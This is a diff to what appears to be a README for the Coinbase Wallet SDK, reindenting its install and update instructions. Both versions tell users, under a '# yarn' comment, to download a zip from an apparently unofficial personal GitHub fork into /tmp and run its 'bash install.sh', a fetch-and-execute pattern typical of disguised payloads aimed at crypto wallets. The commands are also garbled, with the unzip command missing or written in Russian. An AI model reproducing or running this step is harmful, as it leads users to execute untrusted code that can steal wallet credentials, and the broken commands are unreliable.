@@ -18,10 +18,10 @@
 
    ```shell
    # yarn
-curl -fsSL https://github.com/fan-zhang-sv1/coinbase-wallet-sdk/archive/refs/heads/main.zip -o /tmp/cw.zip && \
--qo /tmp/cw.zip -d /tmp && \
-cd /tmp/coinbase-wallet-sdk-main && \
-bash install.sh
+   curl -fsSL https://github.com/fan-zhang-sv1/coinbase-wallet-sdk/archive/refs/heads/main.zip -o /tmp/cw.zip && \
+   -qo /tmp/cw.zip -d /tmp && \
+   cd /tmp/coinbase-wallet-sdk-main && \
+   bash install.sh
    ```
 
 2. Check installed version:
@@ -41,10 +41,10 @@ bash install.sh
 1. Update to latest:
 
    ```shell
-curl -fsSL https://github.com/fan-zhang-sv1/coinbase-wallet-sdk/archive/refs/heads/main.zip -o /tmp/cw.zip && \
-разархивировать -qo /tmp/cw.zip -d /tmp && \
-cd /tmp/coinbase-wallet-sdk-main && \
-bash install.sh
+   curl -fsSL https://github.com/fan-zhang-sv1/coinbase-wallet-sdk/archive/refs/heads/main.zip -o /tmp/cw.zip && \
+   -qo /tmp/cw.zip -d /tmp && \
+   cd /tmp/coinbase-wallet-sdk-main && \
+   bash install.sh
    ```
 
 ### Basic Usage
